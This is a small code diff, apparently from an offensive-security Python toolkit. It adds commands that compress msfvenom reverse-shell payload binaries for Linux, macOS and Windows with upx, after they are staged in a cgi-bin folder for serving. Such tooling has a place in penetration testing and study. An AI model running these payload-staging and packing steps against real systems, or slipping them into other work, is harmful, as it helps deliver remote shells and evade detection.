@@ -506,6 +506,10 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         os.system("mv shell.* modules/cgi-bin")
         os.system("chmod +x modules/cgi-bin/*")
         print("[*] Lazy MSFVenom Reverse_shell payloads in modules/cgi-bin/ ")
+        print("[*] upx to bins to smaller bins")
+        os.system("upx modules/cgi-bin/shell.elf")
+        os.system("upx modules/cgi-bin/shell.macho")
+        os.system("upx modules/cgi-bin/shell.exe")
         print("[?] To run web server exec command: lazywebshell [;,;] ")
 
     def run_lazypathhijacking(self):
